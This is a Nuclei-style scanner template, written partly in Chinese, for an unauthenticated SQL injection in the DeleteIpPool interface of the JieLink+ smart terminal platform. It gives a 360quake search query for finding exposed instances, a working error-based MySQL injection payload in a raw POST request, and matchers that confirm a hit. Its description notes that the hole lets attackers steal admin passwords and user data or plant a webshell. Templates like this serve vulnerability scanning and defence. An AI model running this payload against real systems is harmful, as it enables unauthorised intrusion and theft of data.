id: JieLink-DeleteIpPool-sql

info:
  name: JieLink+ 智能终端操作平台 DeleteIpPool SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    360quake: title="JieLink" AND (favicon: "2f809c4759399cae458a29f24490a114")
    由于JieLink+ 智能终端操作平台 DeleteIpPool接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/Tc4wH0cP1P-Wr-WbzPTc5w
  tags: sql injection

http:
  - raw:
      - |
        POST /project/IPPool/DeleteIpPool HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        ids=-99 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171627171,(SELECT (ELT(7502=7502,1))),0x7171706a71,0x78))s), 8446744073709551610, 8446744073709551610)))&syncFlag=1
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'qqbqq1qqpjqx'
      - type: status
        status: 
          - 200